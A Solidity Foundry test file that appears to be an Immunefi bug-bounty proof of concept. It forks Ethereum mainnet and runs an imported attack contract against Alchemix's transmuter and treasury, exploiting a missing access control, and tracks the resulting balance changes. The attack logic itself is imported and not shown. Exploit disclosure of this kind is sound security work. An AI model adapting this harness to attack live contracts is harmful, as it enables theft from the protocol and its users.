// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@immunefi/PoC.sol";
import "../../src/Alchemix/NoAccessControlAttackContract.sol";

contract PoCNoAccessControl is PoC {
    AttackContract public attackContract;
    IERC20[] tokens;
    IERC20[] tokens_harvest;
    IERC20 rETH = IERC20(0xae78736Cd615f374D3085123A210448E74Fc6393);
    IERC20 alETH = IERC20(0x0100546F2cD4C9D97f798fFC9755E47865FF7Ee6);
    address constant alchemistV2 = 0x062Bf725dC4cDF947aa79Ca2aaCCD4F385b13b5c;
    address constant transmuter = 0xe761bf731A06fE8259FeE05897B2687D56933110;
    address constant treasury = 0x8392F6669292fA56123F71949B52d883aE57e225;

    function setUp() public {
        // Fork from specified block chain at block
        vm.createSelectFork("https://rpc.ankr.com/eth", 18070489);

        // Deploy attack contract
        attackContract = new AttackContract();

        // Fund attacker contract
        deal(EthereumTokens.NATIVE_ASSET, address(attackContract), 1 ether);
        dealFrom(
            rETH,
            0x714301eB35fE043FAa547976ce15BcE57BD53144,
            address(attackContract),
            rETH.balanceOf(0x714301eB35fE043FAa547976ce15BcE57BD53144)
        );
        dealFrom(
            rETH,
            0x7d6149aD9A573A6E2Ca6eBf7D4897c1B766841B4,
            address(attackContract),
            rETH.balanceOf(0x7d6149aD9A573A6E2Ca6eBf7D4897c1B766841B4)
        );

        // Tokens to track during snapshotting
        tokens.push(rETH);
        tokens.push(alETH);
        tokens_harvest.push(EthereumTokens.WETH);

        setAlias(address(attackContract), "Attacker");
        setAlias(transmuter, "Alchemix Transmuter");
        setAlias(treasury, "Alchemix Treasury");

        console.log("\n>>> Initial conditions");
    }

    function testAttack()
        public
        snapshot(transmuter, tokens_harvest)
        snapshot(treasury, tokens_harvest)
        snapshot(address(attackContract), tokens)
    {
        attackContract.initializeAttack();
    }
}
